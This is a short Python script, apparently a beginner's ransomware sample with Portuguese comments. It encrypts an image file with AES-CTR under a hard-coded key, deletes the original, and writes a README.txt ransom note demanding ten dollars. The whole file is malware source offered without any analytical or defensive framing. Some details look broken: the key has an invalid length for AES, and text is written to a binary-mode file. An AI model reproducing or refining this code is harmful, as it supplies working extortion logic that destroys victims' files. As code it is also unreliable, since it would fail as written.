import pyaes
import os

file_name = "foto.png" #receber o arquivo
file = open(file_name, 'rb')
file_data = file.read()
file.close()

key = "0ase9D3R1aV2eh3NJsk92h331hsa"
aes = pyaes.AESModeOfOperationCTR(key)
encripta_dados = aes.encrypt(file_data)
new_file_name = file_name + ".encripted"
new_file = open(new_file_name, "wb")
new_file_data = new_file.write(encripta_dados)
new_file.close()

os.remove(file_name)

text_name = "README.txt"
text = open(text_name, "wb")
text_data = text.write("você foi infectado pelo Jhon, pague 10 dólares e tenha seus arquivos recuperados")
text.close()
